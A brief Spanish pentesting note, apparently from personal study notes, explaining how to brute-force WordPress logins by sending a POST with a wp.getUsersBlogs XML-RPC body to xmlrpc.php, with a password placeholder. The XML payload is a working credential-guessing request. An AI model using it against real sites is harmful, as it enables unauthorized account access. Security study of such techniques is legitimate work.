- Tags: #wordpress #herramientas 
---
Si quisiéramos aplicar fuerza bruta en un [[Wordpress]] de la misma forma que hace [[Wordpress]] PERO DE LA FORMA MANUAL PARA DESCUBRIR credenciales válidas, sería nesecario tramitar una perición por el método POST al archi xmlrpc.php tramitando una estructura deXML tal que sería: 
```
<?xml version=\"1.0\" encoding=\"utf-8\"?>
<methodCall>
<methodName>wp.getUsersBlogs</methodName>
<params>
<param><value>admin</value></param>
<param><value>$password</value></param>
</params>
</methodCall>
```